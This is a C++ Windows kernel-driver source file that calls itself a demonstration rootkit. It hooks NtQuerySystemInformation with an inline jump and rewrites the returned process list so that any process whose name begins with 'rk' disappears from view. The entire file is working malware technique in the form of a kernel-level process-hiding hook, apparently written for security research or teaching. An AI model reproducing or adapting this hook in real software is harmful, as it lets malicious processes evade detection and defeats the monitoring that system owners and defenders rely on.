//
// This module implements a rookit function for demonstration.
//
#include "stdafx.h"
#include "rootkit.h"
#include "util.h"
#include "exclusivity.h"


////////////////////////////////////////////////////////////////////////////////
//
// macro utilities
//


////////////////////////////////////////////////////////////////////////////////
//
// constants and macros
//


////////////////////////////////////////////////////////////////////////////////
//
// types
//

enum SYSTEM_INFORMATION_CLASS { SystemProcessInformation = 5 };


typedef NTSTATUS(NTAPI*NtQuerySystemInformationType)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength);


typedef struct _SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONG64 CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    // omitted. see ole32!_SYSTEM_PROCESS_INFORMATION
} SYSTEM_PROCESS_INFORMATION;


////////////////////////////////////////////////////////////////////////////////
//
// prototypes
//

EXTERN_C static
NTSTATUS NTAPI RootkitpNtQuerySystemInformation(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength);


////////////////////////////////////////////////////////////////////////////////
//
// variables
//

static NtQuerySystemInformationType g_NtQuerySystemInformation;


////////////////////////////////////////////////////////////////////////////////
//
// implementations
//

ALLOC_TEXT(INIT, RootkitEnableRootkit)
EXTERN_C
NTSTATUS RootkitEnableRootkit(
    __in ULONG_PTR ReturnAddressOffset,
    __in ULONG_PTR AsmHandler,
    __in ULONG_PTR AsmHandlerEnd)
{
    PAGED_CODE();
    UNICODE_STRING procName = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
    auto ntQuerySystemInformation = reinterpret_cast<ULONG64>(
        MmGetSystemRoutineAddress(&procName));
    if (!ntQuerySystemInformation)
    {
        return STATUS_UNSUCCESSFUL;
    }

    g_NtQuerySystemInformation = 
        reinterpret_cast<NtQuerySystemInformationType>(AsmHandler);

    FixupAsmCode(ntQuerySystemInformation + ReturnAddressOffset,
        AsmHandler, AsmHandlerEnd);

    auto exclusivity = std::experimental::unique_resource(
        ExclGainExclusivity(), ExclReleaseExclusivity);
    if (!exclusivity)
    {
        return STATUS_UNSUCCESSFUL;
    }

    InstallJump(ntQuerySystemInformation,
        reinterpret_cast<ULONG_PTR>(RootkitpNtQuerySystemInformation));
    return STATUS_SUCCESS;
}


// This is a replaced function with an original NtQuerySystemInformation.
// It will be vulnerable to KHOBE attacks. Do not use it for your product :)
ALLOC_TEXT(PAGED, RootkitpNtQuerySystemInformation)
EXTERN_C static
NTSTATUS NTAPI RootkitpNtQuerySystemInformation(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength)
{
    PAGED_CODE();
    NTSTATUS status = g_NtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemInformationClass != SystemProcessInformation)
    {
        return status;
    }
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    SYSTEM_PROCESS_INFORMATION* curr = nullptr;
    auto next = static_cast<SYSTEM_PROCESS_INFORMATION*>(SystemInformation);

    while (next->NextEntryOffset)
    {
        curr = next;
        next = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(
                reinterpret_cast<PUCHAR>(curr)+curr->NextEntryOffset);

        if (next->ImageName.Buffer[0] == L'r' &&
            next->ImageName.Buffer[1] == L'k')
        {
            if (next->NextEntryOffset)
            {
                curr->NextEntryOffset += next->NextEntryOffset;
            }
            else
            {
                curr->NextEntryOffset = 0;
            }
            next = curr;
        }
    }
    return status;
}

